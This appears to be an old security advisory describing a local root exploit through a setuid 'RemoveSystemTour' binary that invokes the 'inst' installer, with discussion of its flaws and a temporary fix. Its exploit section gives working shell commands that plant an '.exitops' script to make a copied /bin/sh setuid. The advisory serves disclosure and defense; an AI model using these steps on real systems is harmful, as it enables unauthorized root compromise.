RISK. root compromise, denial of service, etc.

Exploit:

First, we set up an environment for running inst. dryrun is set to true
because we are considerate environmentalists.

$ rbase=$HOME; export rbase
$ mkdir -p $HOME/var/inst
$ echo "dryrun: true" > $HOME/.swmgrrc

These three lines should be very familiar to all exploitors.

$ cp -p /bin/sh /tmp/foobar
$ printf '#\!/bin/sh\nchmod 4777 /tmp/foobar\n' > $HOME/var/inst/.exitops
$ chmod a+x $HOME/var/inst/.exitops

Now run it.

$ /usr/lib/tour/bin/RemoveSystemTour

DISCUSSION. The easiest solution is to replace RemoveSystemTour with
a binary that checks the password. However, RemoveSystemTour may not be
the only way to access inst, and so these general recommendations apply:

inst should check UID and lock configuration options when called non-
interactively from versions and with euid 0. inst also has a race
condition on the file /tmp/shPID0, the shell script it creates to make the
appropriate directory (rbase). inst should verify the variables it
uses--by relying on an external shell script, environment variables, IFS,
etc. can be tampered with. Finally, inst will happily overwrite logfiles
specified in the .swmgrrc file and creat() the shell script over anything.

---

TEMPORARY FIX. Either remove the system tour or chmod -s the
RemoveSystemTour binary.
